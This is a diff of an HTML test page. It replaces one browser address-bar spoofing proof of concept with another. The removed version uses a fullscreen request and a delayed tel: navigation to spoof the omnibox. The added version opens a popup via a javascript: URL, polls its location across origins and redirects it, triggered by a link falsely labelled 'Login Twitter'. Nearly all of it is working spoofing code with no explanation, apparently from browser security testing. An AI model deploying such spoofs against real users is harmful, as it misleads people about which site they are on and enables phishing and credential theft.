@@ -1,36 +1,13 @@
 
-<!DOCTYPE html>
-<html lang="en">
-    <head>
-        <title>Security UI Spoof</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-            }         
-            #spoof {
-                width:  100%;
-                height: 100%;
-            }
-        </style>
-        <script>
-            window.onclick = function(){
-                
-                document.documentElement.requestFullscreen();
-                setTimeout('document.location="tel:+123123"', 3000)
-            }
-        </script>
-    </head>  
-    <body>
-        <img id="spoof" style="display: none;" src="spoof.png"></img>
-        <div id="content">
-            <br><br><br>
-            <center>
-                <h1>Click anywhere on the page to spoof the omnibox!</h1>
-            </center>
-        </div>
-    </body>
-  </body>
-</html>
+<script>
+  function next() {
+         w.location.replace('http://www.google.com/csi');
+        }
+
+  function f() {
+    w = window.open("javascript:document.write('spoof');location='http://amazon.com'","new","width=500 height=500");
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+  }
+</script>
+
+<a href="#" onclick="f()">Login Twitter</a>
